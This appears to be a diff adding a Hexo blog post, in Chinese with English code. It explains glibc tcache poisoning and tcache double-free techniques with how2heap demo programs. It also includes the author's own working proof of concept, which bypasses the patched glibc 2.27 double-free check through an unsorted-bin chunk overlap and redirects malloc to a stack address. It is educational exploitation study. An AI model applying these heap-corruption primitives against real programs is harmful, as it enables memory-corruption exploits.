@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
+    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
+    <meta name="description" content="Tcache Poisoninghow2heap tcache_poisoning.c #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&amp;#123;    &#x2F;&#x2F; disable buffering    setbuf(stdin,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tcache Poisoning &amp;&amp; Tcache Dup">
+<meta property="og:url" content="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/index.html">
+<meta property="og:site_name" content="Grxer&#39;s Blog">
+<meta property="og:description" content="Tcache Poisoninghow2heap tcache_poisoning.c #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&amp;#123;    &#x2F;&#x2F; disable buffering    setbuf(stdin,">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/image-20230327091111479.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/image-20230327091058041.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/image-20230327140326972.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/image-20230327140512916.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/image-20230327140608610.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/image-20230327141113916.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/image-20230327141335773.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/image-20230327142253602.png">
+<meta property="article:published_time" content="2023-03-27T00:35:47.000Z">
+<meta property="article:modified_time" content="2023-03-29T16:52:01.786Z">
+<meta property="article:author" content="bxz">
+<meta property="article:tag" content="Tcache Attach">
+<meta property="article:tag" content="Tcache Poisoning">
+<meta property="article:tag" content="Tcache Dup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/image-20230327091111479.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Tcache Poisoning &amp;&amp; Tcache Dup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/03/27/Tcache_house_of_spirit-unlink/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/03/26/Tcache/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&text=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&title=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&is_video=false&description=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tcache Poisoning &amp;&amp; Tcache Dup&body=Check out this article: https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&title=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&title=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&title=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&title=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&name=Tcache Poisoning &amp;&amp; Tcache Dup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&t=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tcache-Poisoning"><span class="toc-number">1.</span> <span class="toc-text">Tcache Poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tcache-Dump"><span class="toc-number">2.</span> <span class="toc-text">Tcache Dump</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Tcache Poisoning &amp;&amp; Tcache Dup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">bxz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-27T00:35:47.000Z" itemprop="datePublished">2023-03-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Tcache-Attach/" rel="tag">Tcache Attach</a>, <a class="tag-link-link" href="/tags/Tcache-Dup/" rel="tag">Tcache Dup</a>, <a class="tag-link-link" href="/tags/Tcache-Poisoning/" rel="tag">Tcache Poisoning</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Tcache-Poisoning"><a href="#Tcache-Poisoning" class="headerlink" title="Tcache Poisoning"></a>Tcache Poisoning</h2><p>how2heap tcache_poisoning.c</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// disable buffering</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">           <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">           <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">    b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer-virtual-machine /m/h/S/h/glibc_2.27&gt; ./tcache_poisoning</span><br><span class="line">This file demonstrates a simple tcache poisoning attack by tricking malloc into</span><br><span class="line">returning a pointer to an arbitrary location (in this case, the stack).</span><br><span class="line">The attack is very similar to fastbin corruption attack.</span><br><span class="line">After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,</span><br><span class="line">We have to create and free one more chunk for padding before fd pointer hijacking.</span><br><span class="line"></span><br><span class="line">The address we want malloc() to return is 0x7fffffffe448.</span><br><span class="line">Allocating 2 buffers.</span><br><span class="line">malloc(128): 0x603260</span><br><span class="line">malloc(128): 0x6032f0</span><br><span class="line">Freeing the buffers...</span><br><span class="line">Now the tcache list has [ 0x6032f0 -&gt; 0x603260 ].</span><br><span class="line">We overwrite the first 8 bytes (fd/next pointer) of the data at 0x6032f0</span><br><span class="line">to point to the location to control (0x7fffffffe448).</span><br><span class="line">Now the tcache list has [ 0x6032f0 -&gt; 0x7fffffffe448 ].</span><br><span class="line">1st malloc(128): 0x6032f0</span><br><span class="line">Now the tcache list has [ 0x7fffffffe448 ].</span><br><span class="line">2nd malloc(128): 0x7fffffffe448</span><br><span class="line">We got the control</span><br></pre></td></tr></table></figure>
+
+<p>覆盖tachebin的next为我们想申请的地址即可</p>
+<p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327091111479.png" alt="image-20230327091111479"></p>
+<p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327091058041.png" alt="image-20230327091058041"></p>
+<p>2.26甚至没有检查tcache的size是否符合要求</p>
+<h2 id="Tcache-Dump"><a href="#Tcache-Dump" class="headerlink" title="Tcache Dump"></a>Tcache Dump</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span>* a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer-virtual-machine /m/h/S/h/glibc_2.27&gt; ./tcache_dup</span><br><span class="line">This file demonstrates a simple double-free attack with tcache.</span><br><span class="line">Allocating buffer.</span><br><span class="line">malloc(8): 0x555555756260</span><br><span class="line">Freeing twice...</span><br><span class="line">free(): double free detected in tcache </span><br><span class="line">grxer@grxer:~$ ldd --version</span><br><span class="line">ldd (Ubuntu GLIBC 2.27-3ubuntu1.6) 2.27</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure>
+
+<p>额，因为doublefree crash掉了，2.27的libc不应该呀，找了下资料发现2020.9.10 2.27-3Ubuntu1.3 用glibc2.31源码进行了一波patch</p>
+<p><strong>我们可以利用unsortedbin来overlapping，构造doublefree</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> attack[<span class="number">15</span>] = <span class="string">&quot;6666666&quot;</span>;</span><br><span class="line">    <span class="type">void</span>* fill[<span class="number">7</span>];</span><br><span class="line">    <span class="type">void</span>* unsortbin;</span><br><span class="line">    <span class="type">void</span>* tcachebin;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        fill[i] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    unsortbin = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    tcachebin = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止和topchunk合并</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        <span class="built_in">free</span>(fill[i]);</span><br><span class="line">    <span class="built_in">free</span>(unsortbin);</span><br><span class="line">    <span class="built_in">free</span>(tcachebin);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(tcachebin);</span><br><span class="line">    <span class="type">long</span>* ptr = <span class="built_in">malloc</span>(<span class="number">0xb0</span>);</span><br><span class="line">    ptr[<span class="number">18</span>] = &amp;attack;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">puts</span>(attack);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;hacker&quot;</span>,<span class="number">7</span>);</span><br><span class="line">    <span class="built_in">puts</span>(attack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/h/glibc_2<span class="number">.27</span>&gt; ./tcache_dup</span><br><span class="line"><span class="number">6666666</span></span><br><span class="line">hacker</span><br></pre></td></tr></table></figure>
+
+<p>先把申请到的前七个堆块释放掉</p>
+<p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140326972.png" alt="image-20230327140326972"></p>
+<p>这样0x90的tcachebin满7个了</p>
+<p><code>free(unsortbin);</code></p>
+<p>就会丢进unsortedbin里</p>
+<p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140512916.png" alt="image-20230327140512916"></p>
+<p><code>free(tcachebin);</code></p>
+<p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140608610.png" alt="image-20230327140608610"></p>
+<p>tcachebin的低地址chunk unsortedbin是free的，会触发unlink操作</p>
+<p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327141113916.png" alt="image-20230327141113916"></p>
+<p><code>malloc(0x80);</code></p>
+<p>让出一个tcachebin</p>
+<p><code>free(tcachebin);</code></p>
+<p>tcachebin进入tcachebin</p>
+<p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327141335773.png" alt="image-20230327141335773"></p>
+<p>这样我们就实现了chunk的overlapping ，</p>
+<p><code>long* ptr = malloc(0xb0);</code></p>
+<p><code>ptr[18] = &amp;attack;</code></p>
+<p>把unsortedbin拿出来,在8*18&#x3D;0x90处也就是tcachebin的next区写入我们attack的栈地址，<strong>tcache bin next地址指向的是chunk的data区，和fastbin指向chunk头不同</strong></p>
+<p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327142253602.png" alt="image-20230327142253602"></p>
+<p><code>malloc(0x80);</code><br><code>ptr = malloc(0x80);</code></p>
+<p>ptr指向我们的attack地址，如果开了canary，这里的attack[15]数组大小至少为15(canary最后一字节为0),tcache_get里会<code>e-&gt;key = NULL;</code>会破坏掉canary</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tcache-Poisoning"><span class="toc-number">1.</span> <span class="toc-text">Tcache Poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tcache-Dump"><span class="toc-number">2.</span> <span class="toc-text">Tcache Dump</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&text=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&title=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&is_video=false&description=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tcache Poisoning &amp;&amp; Tcache Dup&body=Check out this article: https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&title=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&title=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&title=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&title=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&name=Tcache Poisoning &amp;&amp; Tcache Dup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/&t=Tcache Poisoning &amp;&amp; Tcache Dup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    bxz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
